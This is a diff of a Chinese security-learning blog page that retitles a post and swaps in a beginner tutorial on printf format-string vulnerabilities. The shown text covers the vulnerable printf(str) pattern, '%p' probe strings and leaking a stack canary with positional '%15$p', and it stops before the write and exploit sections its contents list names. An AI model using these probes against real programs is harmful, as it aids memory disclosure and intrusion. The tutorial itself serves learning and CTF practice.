@@ -2,21 +2,44 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>格式化字符串漏洞--刷题记录 | swedsn</title>
+  <title>格式化字符串漏洞学习 | swedsn</title>
   <meta name="keywords" content="">
-  <meta name="description" content="格式化字符串漏洞--刷题记录 | swedsn">
+  <meta name="description" content="格式化字符串漏洞学习 | swedsn">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="忙里偷闲，记录生活关于博客我认为搭建博客主要分为三个阶段  第一个阶段：刚开始搭建博客，觉得搭建博客很神奇，就想搭建一个完整的博客，感觉有成就感   第二个阶段：这个时候已经了解了如何搭建博客。此时就想搭建一个好看，功能丰富的博客，于是尝试了不同的框架，更换了各种各样的主题，想搭建一个自己喜欢的一个博客，同时对于博客的认为是给别人看的   第三阶段：现在的我，只想要有一个简单的博客，简单到只要方便">
-<meta property="og:type" content="website">
-<meta property="og:title" content="about">
-<meta property="og:url" content="http://example.com/about/index.html">
+<meta name="description" content="一、格式化字符串的基本原理1、了解printf函数族格式化字符串漏洞主要是printf函数家族的问题。像printf、fprintf、sprintf、snprintf等格式化字符串函数课接受变数量的参数，并且将第一个参数作为格式化字符串 像下面的printf函数一样：前面的第一个参数表示的是格式化字符串，当中的符号说明与后面的参数一一对应。第一个参数中的格式化字符串的数量决定了后面参数的数量  常">
+<meta property="og:type" content="article">
+<meta property="og:title" content="格式化字符串漏洞学习">
+<meta property="og:url" content="http://example.com/2022/07/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/index.html">
 <meta property="og:site_name" content="swedsn">
-<meta property="og:description" content="忙里偷闲，记录生活关于博客我认为搭建博客主要分为三个阶段  第一个阶段：刚开始搭建博客，觉得搭建博客很神奇，就想搭建一个完整的博客，感觉有成就感   第二个阶段：这个时候已经了解了如何搭建博客。此时就想搭建一个好看，功能丰富的博客，于是尝试了不同的框架，更换了各种各样的主题，想搭建一个自己喜欢的一个博客，同时对于博客的认为是给别人看的   第三阶段：现在的我，只想要有一个简单的博客，简单到只要方便">
+<meta property="og:description" content="一、格式化字符串的基本原理1、了解printf函数族格式化字符串漏洞主要是printf函数家族的问题。像printf、fprintf、sprintf、snprintf等格式化字符串函数课接受变数量的参数，并且将第一个参数作为格式化字符串 像下面的printf函数一样：前面的第一个参数表示的是格式化字符串，当中的符号说明与后面的参数一一对应。第一个参数中的格式化字符串的数量决定了后面参数的数量  常">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2022-07-20T11:44:45.000Z">
-<meta property="article:modified_time" content="2022-07-20T12:14:09.781Z">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430215411006.png">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430101408921.png">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430101529916.png">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430101458769.png">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430153742463.png">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430153850406.png">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430153944418.png">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430104238788.png">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430104303662.png">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430102055996.png">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430183334854.png">
+<meta property="og:image" content="http://example.com/img/image-20220430183527080.png">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430211730385.png">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430211756994.png">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430211920243.png">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430212240038.png">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430212852204.png">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430212730081.png">
+<meta property="og:image" content="http://example.com/img/image-20220322215436958-16593323952891.png">
+<meta property="og:image" content="http://example.com/img/image-20220322215947385-16593323952893.png">
+<meta property="og:image" content="http://example.com/img/image-20220720165419041-16593323952895.png">
+<meta property="og:image" content="http://example.com/img/image-20220720165444148.png">
+<meta property="article:published_time" content="2022-07-12T05:51:39.000Z">
+<meta property="article:modified_time" content="2022-08-01T05:44:29.049Z">
 <meta property="article:author" content="swedsn">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430215411006.png">
 
 
 <link rel="icon" href="/img/logo.png">
@@ -126,7 +149,7 @@
     <li>
         <div class="all active" data-rel="全部文章">全部文章
             
-                <small>(23)</small>
+                <small>(17)</small>
             
         </div>
     </li>
@@ -255,7 +278,7 @@
                         <i class="fold iconfont icon-right"></i>
                         
                         Pwn入门
-                        <small>(15)</small>
+                        <small>(11)</small>
                         
                     </div>
                     
@@ -266,7 +289,7 @@
                                         
                                         格式化字符串漏洞
                                         
-                                            <small>(2
+                                            <small>(1
                                                 )</small>
                                         
                                     </div>
@@ -290,7 +313,7 @@
                                         
                                         栈溢出
                                         
-                                            <small>(8
+                                            <small>(5
                                                 )</small>
                                         
                                     </div>
@@ -314,7 +337,7 @@
                         <i class="fold iconfont icon-right"></i>
                         
                         Web安全
-                        <small>(2)</small>
+                        <small>(1)</small>
                         
                     </div>
                     
@@ -325,7 +348,7 @@
                                         
                                         SQL注入
                                         
-                                            <small>(2
+                                            <small>(1
                                                 )</small>
                                         
                                     </div>
@@ -358,8 +381,8 @@
         
     </div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="23">
-<input type="hidden" id="yelog_site_word_count" value="36.3k">
+<input type="hidden" id="yelog_site_posts_number" value="17">
+<input type="hidden" id="yelog_site_word_count" value="31.6k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -414,10 +437,6 @@
     <input id="tag-search" />
     <div class="tag-wrapper">
         
-            <li class="article-tag-list-item">
-                <i class="iconfont icon-tag"></i><a>web安全、sql注入</a>
-            </li>
-        
     </div>
 
 </div>
@@ -427,29 +446,11 @@
         
         
         <a  class="全部文章 Web安全 SQL注入 "
-           href="/2022/07/20/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-sql%E6%B3%A8%E5%85%A5/"
-           data-tag="web安全、sql注入"
-           data-author="" >
-            <span class="post-title" title="ctfshow刷题记录-sql注入">ctfshow刷题记录-sql注入</span>
-            <span class="post-date" title="2022-07-20 19:05:57">2022/07/20</span>
-        </a>
-        
-        
-        <a  class="全部文章 Web安全 SQL注入 "
            href="/2022/07/20/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"
            data-tag=""
            data-author="" >
             <span class="post-title" title="SQL注入总结">SQL注入总结</span>
             <span class="post-date" title="2022-07-20 19:05:32">2022/07/20</span>
-        </a>
-        
-        
-        <a  class="全部文章 "
-           href="/2022/07/20/%E6%9D%82%E8%AE%B0/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title="杂记">杂记</span>
-            <span class="post-date" title="2022-07-20 19:04:35">2022/07/20</span>
         </a>
         
         
@@ -463,19 +464,10 @@
         
         
         <a  class="全部文章 Pwn入门 格式化字符串漏洞 "
-           href="/2022/07/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"
+           href="/2022/07/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"
            data-tag=""
            data-author="" >
-            <span class="post-title" title="格式化字符串漏洞--刷题记录">格式化字符串漏洞--刷题记录</span>
-            <span class="post-date" title="2022-07-12 13:51:47">2022/07/12</span>
-        </a>
-        
-        
-        <a  class="全部文章 Pwn入门 格式化字符串漏洞 "
-           href="/2022/07/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E-%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title="格式化字符串漏洞--基本原理">格式化字符串漏洞--基本原理</span>
+            <span class="post-title" title="格式化字符串漏洞学习">格式化字符串漏洞学习</span>
             <span class="post-date" title="2022-07-12 13:51:39">2022/07/12</span>
         </a>
         
@@ -493,7 +485,7 @@
            href="/2022/07/12/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA-%E4%B8%80%E9%94%AE%E8%8E%B7%E5%8F%96flag/"
            data-tag=""
            data-author="" >
-            <span class="post-title" title="花式栈溢出-一键获取flag">花式栈溢出-一键获取flag</span>
+            <span class="post-title" title="Pwn学习笔记-一键获取flag">Pwn学习笔记-一键获取flag</span>
             <span class="post-date" title="2022-07-12 13:44:56">2022/07/12</span>
         </a>
         
@@ -507,26 +499,17 @@
         </a>
         
         
-        <a  class="全部文章 Pwn入门 栈溢出 "
-           href="/2022/07/12/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA-DynELF/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title="花式栈溢出-DynELF">花式栈溢出-DynELF</span>
-            <span class="post-date" title="2022-07-12 13:44:40">2022/07/12</span>
-        </a>
-        
-        
         <a  class="全部文章 "
-           href="/2022/07/12/%E4%B8%AD%E7%BA%A7ROP%EF%BC%882-1%EF%BC%89-ret2csu/"
+           href="/2022/07/12/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-ret2csu/"
            data-tag=""
            data-author="" >
-            <span class="post-title" title="中级ROP（2-1）-ret2csu">中级ROP（2-1）-ret2csu</span>
+            <span class="post-title" title="Pwn学习笔记-ret2csu">Pwn学习笔记-ret2csu</span>
             <span class="post-date" title="2022-07-12 13:44:28">2022/07/12</span>
         </a>
         
         
         <a  class="全部文章 Pwn入门 栈溢出 "
-           href="/2022/07/12/%E5%9F%BA%E6%9C%ACROP%EF%BC%881-4%EF%BC%89-ret2libc/"
+           href="/2022/07/12/ret2libc%E8%84%9A%E6%9C%AC%E6%A8%A1%E6%9D%BF/"
            data-tag=""
            data-author="" >
             <span class="post-title" title="基本ROP（1-4）--ret2libc">基本ROP（1-4）--ret2libc</span>
@@ -535,25 +518,7 @@
         
         
         <a  class="全部文章 Pwn入门 栈溢出 "
-           href="/2022/07/12/%E5%9F%BA%E6%9C%ACROP%EF%BC%881-3%EF%BC%89-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title="基本ROP（1-3）-系统调用">基本ROP（1-3）-系统调用</span>
-            <span class="post-date" title="2022-07-12 13:44:05">2022/07/12</span>
-        </a>
-        
-        
-        <a  class="全部文章 Pwn入门 栈溢出 "
-           href="/2022/07/12/%E5%9F%BA%E6%9C%ACROP%EF%BC%881-2%EF%BC%89-ret2shellcode/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title="基本ROP（1-2）-ret2shellcode">基本ROP（1-2）-ret2shellcode</span>
-            <span class="post-date" title="2022-07-12 13:43:56">2022/07/12</span>
-        </a>
-        
-        
-        <a  class="全部文章 Pwn入门 栈溢出 "
-           href="/2022/07/12/%E5%9F%BA%E6%9C%ACROP%EF%BC%881-1%EF%BC%89-ret2text/"
+           href="/2022/07/12/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/"
            data-tag=""
            data-author="" >
             <span class="post-title" title="基本ROP（1-1）-ret2text">基本ROP（1-1）-ret2text</span>
@@ -562,46 +527,46 @@
         
         
         <a  class="全部文章 Pwn入门 基础知识 "
-           href="/2022/07/12/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%881-5%EF%BC%89-Linux%E4%B8%8BELF%E6%96%87%E4%BB%B6%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"
+           href="/2022/07/12/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Linux%E4%B8%8BELF%E6%96%87%E4%BB%B6%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"
            data-tag=""
            data-author="" >
-            <span class="post-title" title="基础知识（1-5）-Linux下ELF文件的保护机制">基础知识（1-5）-Linux下ELF文件的保护机制</span>
+            <span class="post-title" title="Pwn学习笔记-Linux下ELF文件的保护机制">Pwn学习笔记-Linux下ELF文件的保护机制</span>
             <span class="post-date" title="2022-07-12 13:40:54">2022/07/12</span>
         </a>
         
         
         <a  class="全部文章 Pwn入门 基础知识 "
-           href="/2022/07/12/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%881-4%EF%BC%89-%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/"
+           href="/2022/07/12/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/"
            data-tag=""
            data-author="" >
-            <span class="post-title" title="基础知识（1-4）-分析工具">基础知识（1-4）-分析工具</span>
+            <span class="post-title" title="Pwn学习笔记-分析工具">Pwn学习笔记-分析工具</span>
             <span class="post-date" title="2022-07-12 13:40:36">2022/07/12</span>
         </a>
         
         
         <a  class="全部文章 Pwn入门 基础知识 "
-           href="/2022/07/12/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%881-3%EF%BC%89-%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80/"
+           href="/2022/07/12/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"
            data-tag=""
            data-author="" >
-            <span class="post-title" title="基础知识（1-3）-二进制基础">基础知识（1-3）-二进制基础</span>
+            <span class="post-title" title="二进制基础学习">二进制基础学习</span>
             <span class="post-date" title="2022-07-12 13:40:27">2022/07/12</span>
         </a>
         
         
         <a  class="全部文章 Pwn入门 基础知识 "
-           href="/2022/07/12/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%881-2%EF%BC%89-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"
+           href="/2022/07/12/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"
            data-tag=""
            data-author="" >
-            <span class="post-title" title="基础知识（1-2）-环境配置">基础知识（1-2）-环境配置</span>
+            <span class="post-title" title="Pwn学习笔记-环境配置">Pwn学习笔记-环境配置</span>
             <span class="post-date" title="2022-07-12 13:40:08">2022/07/12</span>
         </a>
         
         
         <a  class="全部文章 Pwn入门 基础知识 "
-           href="/2022/07/12/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%881-1%EF%BC%89-Linux%E5%9F%BA%E7%A1%80/"
+           href="/2022/07/12/Linux%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"
            data-tag=""
            data-author="" >
-            <span class="post-title" title="基础知识（1-1）-Linux基础">基础知识（1-1）-Linux基础</span>
+            <span class="post-title" title="Linux基础学习">Linux基础学习</span>
             <span class="post-date" title="2022-07-12 13:39:59">2022/07/12</span>
         </a>
         
@@ -625,10 +590,10 @@
         
         
         <a  class="全部文章 开发 Java开发 基础知识 "
-           href="/2022/07/12/Java%E5%AD%A6%E4%B9%A001-%E5%89%8D%E6%8F%90%E5%87%86%E5%A4%87/"
+           href="/2022/07/12/Java%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"
            data-tag=""
            data-author="" >
-            <span class="post-title" title="Java学习01-前提准备">Java学习01-前提准备</span>
+            <span class="post-title" title="Java环境配置">Java环境配置</span>
             <span class="post-date" title="2022-07-12 09:54:29">2022/07/12</span>
         </a>
         
@@ -650,9 +615,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-格式化字符串漏洞-刷题记录" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-格式化字符串漏洞学习" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">格式化字符串漏洞--刷题记录</h1>
+        <h1 class="article-title">格式化字符串漏洞学习</h1>
     
     <div class="article-meta">
         
@@ -672,12 +637,12 @@
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2022-07-20 18:06:04'>2022-07-12 13:51</time>
+            发布时间 : <time class="date" title='最后更新: 2022-08-01 13:44:29'>2022-07-12 13:51</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:1.2k</span>
+        <span>字数:3k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -696,7 +661,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019-%E5%86%B3%E8%B5%9B-PWN5"><span class="toc-text">第五空间2019_决赛_PWN5</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E6%8F%90"><span class="toc-text">前提</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#jarvisoj-fm%E2%80%94%E2%80%94%E4%BB%BB%E6%84%8F%E5%86%99"><span class="toc-text">jarvisoj_fm——任意写</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HarekazeCTF-2019%E2%80%94%E2%80%94ret2libc%EF%BC%88printf%E6%B3%84%E9%9C%B2%EF%BC%89"><span class="toc-text">HarekazeCTF_2019——ret2libc（printf泄露）</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="toc-text">一、格式化字符串的基本原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E4%BA%86%E8%A7%A3printf%E5%87%BD%E6%95%B0%E6%97%8F"><span class="toc-text">1、了解printf函数族</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81printf%E7%9A%84%E8%BE%93%E5%87%BA%E5%8E%9F%E7%90%86"><span class="toc-text">2、printf的输出原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81printf%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%82%B9"><span class="toc-text">3、printf的漏洞利用点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81-%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-text">4、$的使用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E2%80%94%E2%80%94%E4%BB%BB%E6%84%8F%E8%AF%BB"><span class="toc-text">二、格式化字符串漏洞——任意读</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E6%B3%84%E9%9C%B2canary"><span class="toc-text">1、泄露canary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E6%B3%84%E9%9C%B2pie%E5%9F%BA%E5%9C%B0%E5%9D%80"><span class="toc-text">2、泄露pie基地址</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E2%80%94%E2%80%94%E4%BB%BB%E6%84%8F%E5%86%99"><span class="toc-text">三、格式化字符串漏洞——任意写</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E7%BB%95%E8%BF%87%E5%88%A4%E6%96%AD%EF%BC%8C%E4%BF%AE%E6%94%B9%E6%9F%90%E4%B8%AA%E6%95%B0%E5%80%BC"><span class="toc-text">1、绕过判断，修改某个数值</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E4%BB%BB%E6%84%8F%E5%86%99%E7%A5%9E%E5%99%A8%E2%80%94%E2%80%94fmtstr-payload"><span class="toc-text">2、任意写神器——fmtstr_payload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E2%80%94%E2%80%94%E6%97%A0%E9%99%90%E5%BE%AA%E7%8E%AF"><span class="toc-text">四、格式化字符串漏洞——无限循环</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%B8%B8%E8%A7%81%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E9%A2%98%E7%9B%AE"><span class="toc-text">五、常见格式化字符串漏洞题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019-%E5%86%B3%E8%B5%9B-PWN5"><span class="toc-text">1、第五空间2019_决赛_PWN5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81jarvisoj-fm"><span class="toc-text">2、jarvisoj_fm</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81HarekazeCTF-2019"><span class="toc-text">3、HarekazeCTF_2019</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">六、参考链接</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -712,28 +677,160 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="第五空间2019_决赛_PWN5"></a>第五空间2019_决赛_PWN5</h1><p>格式化字符串漏洞任意写：<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=pwn&amp;number=2&amp;grade=0&amp;id=5050&amp;page=1">https://adworld.xctf.org.cn/task/answer?type=pwn&amp;number=2&amp;grade=0&amp;id=5050&amp;page=1</a></p>
-<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>利用格式化字符串漏洞的任意写功能，将随机数的值修改成一个固定的值</p>
+        <h1 id="一、格式化字符串的基本原理"><a href="#一、格式化字符串的基本原理" class="headerlink" title="一、格式化字符串的基本原理"></a>一、格式化字符串的基本原理</h1><h2 id="1、了解printf函数族"><a href="#1、了解printf函数族" class="headerlink" title="1、了解printf函数族"></a>1、了解printf函数族</h2><p>格式化字符串漏洞主要是printf函数家族的问题。像printf、fprintf、sprintf、snprintf等格式化字符串函数课接受变数量的参数，并且将第一个参数作为格式化字符串</p>
+<p>像下面的printf函数一样：前面的第一个参数表示的是格式化字符串，当中的符号说明与后面的参数一一对应。第一个参数中的格式化字符串的数量决定了后面参数的数量</p>
+<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430215411006.png" alt="image-20220430215411006"></p>
+<p>常见的符号i说明：</p>
+<p>（1）%d：以十进制形式输出带符号整数</p>
+<p>（2） %s：不是打印栈中的内容，而是通过栈中地址寻址。 把存储单元内的数据转换成ASCII字符格式输出，直到遇到字符””\0”才会停止</p>
+<p>（3）%p：将所指向的内容当成是指针来输出，不是输出它的地址，实际上与输出十六进制格式差不多</p>
+<p>它打印出来的是这个栈地址所指向的内容：</p>
+<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430101408921.png" alt="image-20220430101408921"></p>
+<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430101529916.png" alt="image-20220430101529916"></p>
+<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430101458769.png" alt="image-20220430101458769"></p>
+<h2 id="2、printf的输出原理"><a href="#2、printf的输出原理" class="headerlink" title="2、printf的输出原理"></a>2、printf的输出原理</h2><p>（1）其中，它的第一个是格式化字符串，然后接下来的就是它的后门几个参数，格式化字符串位于esp处</p>
+<pre><code class="c">#include &lt;stdio.h&gt;
+
+int main()&#123;
+
+    char str[] = &quot;Hello&quot;;
+    int x = 32;
+    char s[] = &quot;pwnpwnpwn&quot;;
+    printf(&quot;%s %d %s %c&quot;, str, x, s, &#39;\n&#39;);
+    return 0;
+&#125;
+</code></pre>
+<p>（2）printf的读取方式：</p>
+<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430153742463.png" alt="image-20220430153742463"></p>
+<p>（3）它会按照参数的顺序以此读取内容，但是此时如果我修改掉它的第一个参数的内容为第三个参数的数值，那么此时它的输出就会发生变化</p>
+<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430153850406.png" alt="image-20220430153850406"></p>
+<p>（4）此时它的输出就为：pwnpwnpwn 32 pwnpwnpwn</p>
+<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430153944418.png" alt="image-20220430153944418"></p>
+<p>结论：</p>
+<p>① 如果我们能够控制格式化字符串的内容，我们就能得到栈上所有内容的值</p>
+<p>② 再通过%s能够任意地址读取了</p>
+<h2 id="3、printf的漏洞利用点"><a href="#3、printf的漏洞利用点" class="headerlink" title="3、printf的漏洞利用点"></a>3、printf的漏洞利用点</h2><p>（1）我们都知道printf格式化字符串的里的个数和参数的个数都是相同的。 正常使用printf函数：</p>
+<pre><code class="c">char str[100];
+scnaf(&quot;%s&quot;, &amp;str);
+printf(&quot;%s&quot;, str);
+</code></pre>
+<p>（2）但是有时候为了简写，它会省略格式化字符串</p>
+<pre><code class="c">char str[100];
+scnaf(&quot;%s&quot;, &amp;str);
+printf(str);
+</code></pre>
+<p>（4）如果我们str输入的内容是：格式化字符串的形式，它就会把这些内容当作是格式化字符串，然后一次输出格式化字符串后面的每一个参数</p>
+<p>然而，有时候为了省事会写成</p>
+<pre><code class="c">char str[100];
+scanf(&quot;%s&quot;, &amp;str);
+printf(str);
+</code></pre>
+<p>（5）这种情况正常情况下是没有什么问题，但是我如果添加上格式化字符串以后</p>
+<blockquote>
+<p>aaaa-%p-%p-%p-%p-%p-%p-%p-%p</p>
+</blockquote>
+<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430104238788.png" alt="image-20220430104238788"></p>
+<p>（6）而printf输出的都是栈上的所有内容，也就是说这样就可以通过格式化字符串泄露任意地址，其中较为常见的就是泄露cananry的地址，只要知道canary地址相对于esp的地址，就可以通过%k$p的相对地址来泄露canary的数值</p>
+<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430104303662.png" alt="image-20220430104303662"></p>
+<h2 id="4、-的使用"><a href="#4、-的使用" class="headerlink" title="4、$的使用"></a>4、$的使用</h2><p>（4）%K$d：将更改参数对应顺序，与格式化字符串后的第K个参数进行对应</p>
+<p>比如下面的printf，他的第一个参数是</p>
+<pre><code class="c">#include &lt;stdio.h&gt;
+
+int main()&#123;
+
+    int a = 4, b = 6, c = 2;
+    printf(&quot;%3$d + %1$d = %2$d\n&quot;,a, b, c);
+    return 0;
+&#125;
+</code></pre>
+<p>正常情况下根据参数的位置输出的是4 + 6 &#x3D; 2，但是在%d加上指定的参数的位置以后就可以获取到相应的内容</p>
+<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430102055996.png" alt="image-20220430102055996"></p>
+<p>%k在任何的格式化情况下都可以使用：</p>
+<h1 id="二、格式化字符串漏洞——任意读"><a href="#二、格式化字符串漏洞——任意读" class="headerlink" title="二、格式化字符串漏洞——任意读"></a>二、格式化字符串漏洞——任意读</h1><h2 id="1、泄露canary"><a href="#1、泄露canary" class="headerlink" title="1、泄露canary"></a>1、泄露canary</h2><p>其实前面讲解的很清楚了，gdb动态调试能知道canary的位置相对于esp的起始位置，然后利用%K$p 将canary打印出来即可。解题步骤</p>
+<p>（1） 获取到canary的地址，可以发现canary距离esp的位置为15，所以利用 %15$p 就可以获取到canary的值</p>
+<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430183334854.png" alt="image-20220430183334854"></p>
+<p><img src="/img/image-20220430183527080.png" alt="image-20220430183527080"></p>
